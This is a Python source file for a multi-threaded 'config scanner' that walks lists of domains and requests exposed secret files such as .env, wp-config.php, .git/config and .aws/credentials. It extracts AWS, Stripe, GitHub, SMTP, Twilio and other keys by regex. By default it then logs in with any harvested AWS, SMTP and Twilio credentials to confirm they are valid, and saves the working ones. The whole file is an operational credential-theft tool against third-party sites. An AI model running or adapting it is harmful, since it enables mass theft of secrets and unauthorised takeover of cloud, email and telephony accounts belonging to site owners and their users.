import requests
import concurrent.futures
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init
import datetime
import os
import argparse
import time
import random
import re
import json
from tqdm import tqdm
import boto3
import smtplib
from email.mime.text import MIMEText
import twilio.rest

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
init(autoreset=True)

class ConfigScanner:
    def __init__(self, threads=10, timeout=15, output_dir=None, verbose=False, test_creds=True):
        self.colors = {
            'red': Fore.RED,
            'green': Fore.GREEN,
            'blue': Fore.BLUE,
            'yellow': Fore.YELLOW,
            'cyan': Fore.CYAN,
            'magenta': Fore.MAGENTA,
            'white': Fore.WHITE,
            'reset': Style.RESET_ALL
        }
        
        self.timeout = timeout
        self.threads = threads
        self.verbose = verbose
        self.test_creds = test_creds
        
        self.stats = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'vulnerable': 0,
            'valid_creds': 0
        }
        
        self.date = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        if output_dir:
            self.output_dir = output_dir
        else:
            pwd = os.getcwd()
            self.output_dir = os.path.join(pwd, f"output/{self.date}/")
        
        try:
            os.makedirs(self.output_dir, exist_ok=True)
        except Exception as e:
            print(f"{self.colors['red']}[ERROR] Failed to create output directory: {e}{self.colors['reset']}")
            exit(1)
            
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
        ]
        
        self.paths = [
            "/.env",
            "/.env.bak",
            "/.env.dev",
            "/.env.development",
            "/.env.prod",
            "/.env.production",
            "/.env.local",
            "/.env.example",
            "/.env.backup",
            "/.env.save",
            "/.env.old",
            "/.aws/credentials",
            "/phpinfo",
            "/phpinfo.php",
            "/info.php",
            "/aws.yml",
            "/config/aws.yml",
            "/.json",
            "/.config",
            "/config.yaml",
            "/config.json",
            "/configuration.php",
            "/api/config",
            "/api/credentials",
            "/storage/logs/laravel.log",
            "/laravel-errors.log",
            "/app/config/parameters.yml",
            "/app/config/config.yml",
            "/config.yml",
            "/wp-config.php",
            "/wp-config.php.bak",
            "/wp-config.php.old",
            "/config.php",
            "/config.inc.php",
            "/application/config/database.php",
            "/system/application/config/database.php",
            "/.git/config",
            "/db.php",
            "/db.inc.php",
            "/database.php",
            "/database.inc.php",
            "/settings.php",
            "/credentials.json",
            "/credentials.xml",
            "/firebase.json",
            "/secrets.yml",
            "/secrets.yaml",
            "/application.properties",
            "/application.yml",
            "/application.yaml",
            "/debug.log"
        ]
        
        self.patterns = {
            'aws': {
                'regex': r'(AKIA[0-9A-Z]{16})|aws_access_key|aws_secret_key|AWS_ACCESS_KEY_ID\s*=\s*([A-Za-z0-9/+]{20,40})|AWS_SECRET_ACCESS_KEY\s*=\s*([A-Za-z0-9/+]{40,64})',
                'file': 'aws_credentials.txt'
            },
            'twilio': {
                'regex': r'(TWILIO_ACCOUNT_SID|TWILIO_AUTH_TOKEN|TWILLO_SID|AC[a-zA-Z0-9]{32})',
                'file': 'twilio_credentials.txt'
            },
            'database': {
                'regex': r'(DB_USERNAME|DB_PASSWORD|DATABASE_URL|MYSQL_ROOT_PASSWORD)',
                'file': 'database_credentials.txt'
            },
            'app_key': {
                'regex': r'APP_KEY\s*=\s*base64:([a-zA-Z0-9+/=]+)',
                'file': 'app_keys.txt'
            },
            'sendgrid': {
                'regex': r'(SENDGRID_API_KEY|SG\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)',
                'file': 'sendgrid_credentials.txt'
            },
            'mailgun': {
                'regex': r'(MAILGUN_API_KEY|MAILGUN_DOMAIN|key-[a-zA-Z0-9]{32})',
                'file': 'mailgun_credentials.txt'
            },
            'nexmo': {
                'regex': r'(NEXMO_KEY|NEXMO_SECRET)',
                'file': 'nexmo_credentials.txt'
            },
            'stripe': {
                'regex': r'(STRIPE_KEY|STRIPE_SECRET|sk_live_[0-9a-zA-Z]{24})',
                'file': 'stripe_credentials.txt'
            },
            'github': {
                'regex': r'(GITHUB_TOKEN|GITHUB_SECRET|github_pat_[a-zA-Z0-9_]{82})',
                'file': 'github_tokens.txt'
            },
            'firebase': {
                'regex': r'(FIREBASE_API_KEY|FIREBASE_AUTH_DOMAIN)',
                'file': 'firebase_credentials.txt'
            },
            'smtp': {
                'regex': r'(MAIL_PASSWORD|MAIL_USERNAME|SMTP_PASSWORD|MAIL_HOST|SMTP_HOST)',
                'file': 'smtp_credentials.txt'
            },
            'secret_key': {
                'regex': r'(SECRET_KEY|API_SECRET|API_TOKEN)',
                'file': 'secret_keys.txt'
            },
            'jwt': {
                'regex': r'(JWT_SECRET|JWT_PRIVATE_KEY)',
                'file': 'jwt_secrets.txt'
            },
            'ssh': {
                'regex': r'(ssh-rsa|-----BEGIN RSA PRIVATE KEY-----)',
                'file': 'ssh_keys.txt'
            },
            'phpinfo': {
                'regex': r'PHP Version|phpinfo\(\)',
                'file': 'phpinfo_pages.txt'
            }
        }
    
    def banner(self):
        banner_text = f"""
{self.random_color()}
 ██████╗ ██████╗ ███╗   ██╗███████╗██╗ ██████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██╔════╝██╔═══██╗████╗  ██║██╔════╝██║██╔════╝     ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
██║     ██║   ██║██╔██╗ ██║█████╗  ██║██║  ███╗    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██║     ██║   ██║██║╚██╗██║██╔══╝  ██║██║   ██║    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
╚██████╗╚██████╔╝██║ ╚████║██║     ██║╚██████╔╝    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝     ╚═╝ ╚═════╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
{self.colors['reset']}
{self.random_color()}[ Advanced Config & Credential Laravel Scanner with Testing ]{self.colors['reset']}
{self.colors['cyan']}[ Developed By: v01_dy | Enhanced Version ]{self.colors['reset']}
{self.colors['yellow']}[ Scan Date: {self.date} ]{self.colors['reset']}
"""
        print(banner_text)
    
    def random_color(self):
        return random.choice([self.colors['red'], self.colors['green'], self.colors['blue'], 
                              self.colors['yellow'], self.colors['cyan'], self.colors['magenta']])
    
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def save_result(self, file_name, content):
        try:
            file_path = os.path.join(self.output_dir, file_name)
            with open(file_path, "a") as f:
                f.write(content + "\n")
            return True
        except Exception as e:
            if self.verbose:
                print(f"{self.colors['red']}[ERROR] Failed to save to {file_name}: {e}{self.colors['reset']}")
            return False
    
    def save_detailed_result(self, file_name, url, match_type, content, is_valid=False):
        try:
            file_path = os.path.join(self.output_dir, file_name)
            with open(file_path, "a") as f:
                f.write(f"URL: {url}\n")
                f.write(f"Type: {match_type}\n")
                if is_valid:
                    f.write(f"Status: VALID CREDENTIALS ✓\n")
                f.write(f"Content:\n{content}\n")
                f.write("-" * 80 + "\n\n")
            return True
        except Exception as e:
            if self.verbose:
                print(f"{self.colors['red']}[ERROR] Failed to save detailed result to {file_name}: {e}{self.colors['reset']}")
            return False
    
    def test_aws_credentials(self, content):
        access_key_match = re.search(r'(?:AWS_ACCESS_KEY_ID|aws_access_key_id)\s*=\s*([A-Za-z0-9/+]{20,40})', content, re.IGNORECASE)
        secret_key_match = re.search(r'(?:AWS_SECRET_ACCESS_KEY|aws_secret_access_key)\s*=\s*([A-Za-z0-9/+]{40,64})', content, re.IGNORECASE)
        
        if access_key_match and secret_key_match:
            access_key = access_key_match.group(1)
            secret_key = secret_key_match.group(1)
            
            try:
                client = boto3.client(
                    's3',
                    aws_access_key_id=access_key,
                    aws_secret_access_key=secret_key
                )
                response = client.list_buckets()
                bucket_count = len(response['Buckets'])
                valid_msg = f"VALID AWS CREDENTIALS - Access to {bucket_count} S3 buckets"
                print(f"{self.colors['magenta']}[VALID] {valid_msg}{self.colors['reset']}")
                return True, valid_msg
            except Exception as e:
                return False, f"Invalid AWS credentials: {str(e)}"
        return False, "Insufficient credential information"
    
    def test_smtp_credentials(self, content):
        host_match = re.search(r'(?:MAIL_HOST|SMTP_HOST)\s*=\s*([A-Za-z0-9.-]+)', content, re.IGNORECASE)
        port_match = re.search(r'(?:MAIL_PORT|SMTP_PORT)\s*=\s*(\d+)', content, re.IGNORECASE)
        user_match = re.search(r'(?:MAIL_USERNAME|SMTP_USERNAME)\s*=\s*([A-Za-z0-9._@-]+)', content, re.IGNORECASE)
        pass_match = re.search(r'(?:MAIL_PASSWORD|SMTP_PASSWORD)\s*=\s*([A-Za-z0-9._@!#$%^&*-]+)', content, re.IGNORECASE)
        
        if host_match and user_match and pass_match:
            host = host_match.group(1)
            port = 25
            if port_match:
                port = int(port_match.group(1))
            username = user_match.group(1)
            password = pass_match.group(1)
            
            try:
                with smtplib.SMTP(host, port, timeout=10) as server:
                    server.ehlo()
                    if port == 587:
                        server.starttls()
                        server.ehlo()
                    server.login(username, password)
                    valid_msg = f"VALID SMTP CREDENTIALS - {username}:{password}@{host}:{port}"
                    print(f"{self.colors['magenta']}[VALID] {valid_msg}{self.colors['reset']}")
                    return True, valid_msg
            except Exception as e:
                return False, f"Invalid SMTP credentials: {str(e)}"
        return False, "Insufficient credential information"
    
    def test_twilio_credentials(self, content):
        account_sid_match = re.search(r'(?:TWILIO_ACCOUNT_SID|twilio_account_sid)\s*=\s*(AC[a-zA-Z0-9]{32})', content, re.IGNORECASE)
        auth_token_match = re.search(r'(?:TWILIO_AUTH_TOKEN|twilio_auth_token)\s*=\s*([a-zA-Z0-9]{32})', content, re.IGNORECASE)
        
        if account_sid_match and auth_token_match:
            account_sid = account_sid_match.group(1)
            auth_token = auth_token_match.group(1)
            
            try:
                client = twilio.rest.Client(account_sid, auth_token)
                numbers = client.incoming_phone_numbers.list(limit=5)
                number_count = len(numbers)
                valid_msg = f"VALID TWILIO CREDENTIALS - Account has {number_count} phone numbers"
                print(f"{self.colors['magenta']}[VALID] {valid_msg}{self.colors['reset']}")
                return True, valid_msg
            except Exception as e:
                return False, f"Invalid Twilio credentials: {str(e)}"
        return False, "Insufficient credential information"
    
    def analyze_response(self, response, url):
        found_something = False
        try:
            content = response.text
            
            for pattern_name, pattern_data in self.patterns.items():
                matches = re.findall(pattern_data['regex'], content, re.IGNORECASE)
                if matches:
                    found_something = True
                    self.stats['vulnerable'] += 1
                    
                    print(f"{self.colors['green']}[+] Found {pattern_name.upper()} at {url}{self.colors['reset']}")
                    self.save_result(pattern_data['file'], url)
                    
                    context_lines = []
                    for line in content.split('\n'):
                        if any(re.search(pattern_data['regex'], line, re.IGNORECASE) for _ in [1]):
                            context_lines.append(line.strip())
                    
                    detailed_file = f"detailed_{pattern_data['file']}"
                    
                    is_valid = False
                    valid_msg = ""
                    
                    if self.test_creds:
                        if pattern_name == 'aws':
                            is_valid, valid_msg = self.test_aws_credentials(content)
                        elif pattern_name == 'smtp':
                            is_valid, valid_msg = self.test_smtp_credentials(content)
                        elif pattern_name == 'twilio':
                            is_valid, valid_msg = self.test_twilio_credentials(content)
                    
                    if is_valid:
                        self.stats['valid_creds'] += 1
                        self.save_result("valid_credentials.txt", f"{url} - {pattern_name} - {valid_msg}")
                        
                    self.save_detailed_result(detailed_file, url, pattern_name, "\n".join(context_lines), is_valid)
            
            if not found_something and self.verbose:
                print(f"{self.colors['yellow']}[-] No sensitive data found at {url}{self.colors['reset']}")
                
            return found_something
                
        except Exception as e:
            if self.verbose:
                print(f"{self.colors['red']}[ERROR] Failed to analyze response from {url}: {e}{self.colors['reset']}")
            return False
    
    def check_url(self, url):
        self.stats['total'] += 1
        headers = {"User-Agent": self.get_random_user_agent()}
        
        try:
            response = requests.get(
                url, 
                headers=headers, 
                timeout=self.timeout, 
                allow_redirects=False,
                verify=False
            )
            
            self.stats['success'] += 1
            status_code = response.status_code
            
            if status_code in [200, 301, 302]:
                try:
                    debug_response = requests.post(
                        url, 
                        headers=headers, 
                        data={"debug": "true", "test[]": "test"},
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    if "stack trace" in debug_response.text.lower() or "syntax error" in debug_response.text.lower():
                        print(f"{self.colors['green']}[+] Found DEBUG MODE at {url}{self.colors['reset']}")
                        self.save_result("debug_mode.txt", url)
                        self.save_detailed_result("detailed_debug_mode.txt", url, "debug_mode", debug_response.text[:500])
                except:
                    pass
                    
                return self.analyze_response(response, url)
            else:
                if self.verbose:
                    print(f"{self.colors['yellow']}[-] Status {status_code} for {url}{self.colors['reset']}")
                return False
                
        except requests.exceptions.Timeout:
            self.stats['failed'] += 1
            if self.verbose:
                print(f"{self.colors['red']}[TIMEOUT] {url}{self.colors['reset']}")
            return False
        except requests.exceptions.ConnectionError:
            self.stats['failed'] += 1
            if self.verbose:
                print(f"{self.colors['red']}[CONNECTION ERROR] {url}{self.colors['reset']}")
            return False
        except Exception as e:
            self.stats['failed'] += 1
            if self.verbose:
                print(f"{self.colors['red']}[ERROR] {url}: {str(e)}{self.colors['reset']}")
            return False
    
    def scan_domain(self, domain):
        if not domain.startswith(('http://', 'https://')):
            domain = f"http://{domain}"
        
        if domain.endswith('/'):
            domain = domain[:-1]
            
        results = []
        
        try:
            response = requests.get(
                domain, 
                headers={"User-Agent": self.get_random_user_agent()}, 
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            
            if response.status_code in [200, 301, 302]:
                for path in self.paths:
                    url = f"{domain}{path}"
                    result = self.check_url(url)
                    if result:
                        results.append(url)
            else:
                if self.verbose:
                    print(f"{self.colors['red']}[NOT ACCESSIBLE] {domain} - Status: {response.status_code}{self.colors['reset']}")
                    
        except Exception as e:
            if self.verbose:
                print(f"{self.colors['red']}[ERROR] Cannot access {domain}: {str(e)}{self.colors['reset']}")
        
        return results
    
    def scan_domains(self, domains):
        start_time = time.time()
        
        print(f"{self.colors['blue']}[INFO] Starting scan on {len(domains)} domains with {self.threads} threads{self.colors['reset']}")
        print(f"{self.colors['blue']}[INFO] Credential testing is {'ENABLED' if self.test_creds else 'DISABLED'}{self.colors['reset']}")
        
        with open(os.path.join(self.output_dir, "scanned_domains.txt"), "w") as f:
            for domain in domains:
                f.write(f"{domain}\n")
        
        with tqdm(total=len(domains), desc="Scanning", unit="domain") as pbar:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(self.scan_domain, domain) for domain in domains]
                
                for future in concurrent.futures.as_completed(futures):
                    pbar.update(1)
        
        duration = time.time() - start_time
        self.print_summary(duration)
        
    def print_summary(self, duration):
        print("\n" + "=" * 60)
        print(f"{self.colors['cyan']}SCAN SUMMARY{self.colors['reset']}")
        print("=" * 60)
        print(f"{self.colors['white']}Total URLs checked: {self.stats['total']}{self.colors['reset']}")
        print(f"{self.colors['green']}Successful requests: {self.stats['success']}{self.colors['reset']}")
        print(f"{self.colors['red']}Failed requests: {self.stats['failed']}{self.colors['reset']}")
        print(f"{self.colors['yellow']}Vulnerable endpoints found: {self.stats['vulnerable']}{self.colors['reset']}")
        if self.test_creds:
            print(f"{self.colors['magenta']}Valid credentials found: {self.stats['valid_creds']}{self.colors['reset']}")
        print(f"{self.colors['white']}Scan duration: {duration:.2f} seconds{self.colors['reset']}")
        print(f"{self.colors['cyan']}Results saved to: {self.output_dir}{self.colors['reset']}")
        print("=" * 60 + "\n")
        
        summary = {
            "scan_date": self.date,
            "stats": self.stats,
            "duration_seconds": duration,
            "output_directory": self.output_dir
        }
        
        with open(os.path.join(self.output_dir, "summary.json"), "w") as f:
            json.dump(summary, f, indent=4)

def main():
    parser = argparse.ArgumentParser(description='Advanced Configuration Scanner with Credential Testing')
    parser.add_argument('-l', '--list', help='File containing list of domains to scan')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-o', '--output', help='Output directory for results')
    parser.add_argument('-T', '--timeout', type=int, default=15, help='Request timeout in seconds (default: 15)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-s', '--single', help='Scan a single domain')
    parser.add_argument('-n', '--no-test', action='store_true', help='Disable credential testing')
    
    args = parser.parse_args()
    
    scanner = ConfigScanner(
        threads=args.threads,
        timeout=args.timeout,
        output_dir=args.output,
        verbose=args.verbose,
        test_creds=not args.no_test
    )
    
    scanner.banner()
    
    if args.list:
        try:
            with open(args.list, 'r') as f:
                domains = [line.strip() for line in f if line.strip()]
            
            if not domains:
                print(f"{scanner.colors['red']}[ERROR] No domains found in the list file{scanner.colors['reset']}")
                return
                
            scanner.scan_domains(domains)
        except FileNotFoundError:
            print(f"{scanner.colors['red']}[ERROR] List file not found: {args.list}{scanner.colors['reset']}")
        except Exception as e:
            print(f"{scanner.colors['red']}[ERROR] Failed to read domains list: {str(e)}{scanner.colors['reset']}")
    elif args.single:
        scanner.scan_domains([args.single])
    else:
        list_path = input(f"{scanner.colors['cyan']}Enter path to domain list: {scanner.colors['reset']}")
        try:
            with open(list_path, 'r') as f:
                domains = [line.strip() for line in f if line.strip()]
            
            if not domains:
                print(f"{scanner.colors['red']}[ERROR] No domains found in the list file{scanner.colors['reset']}")
                return
            
            thread_count = input(f"{scanner.colors['cyan']}Enter thread count [10]: {scanner.colors['reset']}")
            if thread_count.strip() and thread_count.isdigit():
                scanner.threads = int(thread_count)
                
            test_creds = input(f"{scanner.colors['cyan']}Test discovered credentials? (y/n) [y]: {scanner.colors['reset']}")
            if test_creds.lower() == 'n':
                scanner.test_creds = False
                
            scanner.scan_domains(domains)
        except FileNotFoundError:
            print(f"{scanner.colors['red']}[ERROR] List file not found: {list_path}{scanner.colors['reset']}")
        except Exception as e:
            print(f"{scanner.colors['red']}[ERROR] Failed to read domains list: {str(e)}{scanner.colors['reset']}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan aborted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] An unexpected error occurred: {str(e)}{Style.RESET_ALL}")